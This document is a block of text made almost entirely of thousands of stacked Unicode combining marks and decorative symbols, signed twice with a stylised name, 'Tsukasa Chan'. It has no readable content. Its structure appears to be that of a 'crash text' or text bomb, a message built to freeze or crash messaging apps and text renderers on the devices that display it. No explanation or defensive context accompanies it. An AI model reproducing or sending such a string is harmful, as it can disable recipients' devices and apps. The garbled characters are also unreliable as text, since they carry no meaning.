ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝